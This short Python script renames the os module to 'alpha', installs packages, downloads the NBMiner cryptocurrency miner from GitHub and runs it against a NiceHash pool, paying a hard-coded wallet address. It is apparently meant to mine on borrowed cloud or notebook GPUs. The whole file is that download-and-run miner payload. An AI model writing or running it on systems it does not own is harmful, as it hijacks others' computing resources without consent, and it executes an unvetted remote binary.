import os as alpha
alpha.system("nvidia-smi")
alpha.system("pip install --upgrade pip")
alpha.system("pip install wget -Y")
alpha.system("apt update && apt install git wget nano libpci-dev  && wget https://github.com/NebuTech/NBMiner/releases/download/v36.1/NBMiner_36.1_Linux.tgz && tar -xvf  NBMiner_36.1_Linux.tgz && cd NBMiner_Linux && clear && ./nbminer -a ethash -o nicehash+tcp://daggerhashimoto.usa.nicehash.com:3353 -u 33ztip9uQphrGRA4mQzoMG7ACDfDfatGFp.RIG")

